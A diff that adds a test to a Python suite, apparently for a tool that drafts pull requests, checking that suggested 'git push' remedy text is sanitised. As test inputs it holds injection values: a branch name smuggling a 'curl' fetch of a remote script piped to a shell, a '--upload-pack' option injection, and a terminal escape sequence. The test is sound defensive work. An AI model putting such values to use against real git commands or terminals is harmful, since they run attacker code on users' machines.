@@ -552,6 +552,21 @@ class IdentityTests(CheckpointCase):
         self.assertIn("git push -u origin 'x;curl${IFS}evil.sh|sh'", outcome.remedy)
         self.assertEqual(self.fake.gh_calls(), [])
 
+    def test_remedy_never_carries_options_or_control_characters(self) -> None:
+        # Security review: shlex.quote stops neither a leading "-" (an option
+        # to the pasted command) nor terminal escape sequences.
+        for value in ("--upload-pack=evil", "a\x1b[2Jb", "x\ny"):
+            with self.subTest(value=value):
+                outcome = draft_pr._outcome(  # noqa: SLF001
+                    "pending",
+                    "not-published",
+                    fill={"remote": value, "branch": value},
+                )
+                self.assertEqual(
+                    outcome.remedy,
+                    "publish the branch, e.g. git push -u '<remote>' '<branch>'",
+                )
+
     def test_non_github_remote_is_unlinked(self) -> None:
         git(self.repo.root, "remote", "set-url", "origin", "https://gitlab.com/o/r.git")
         self.assertOutcome(self.check(), "blocked-unlinked", "not-github")
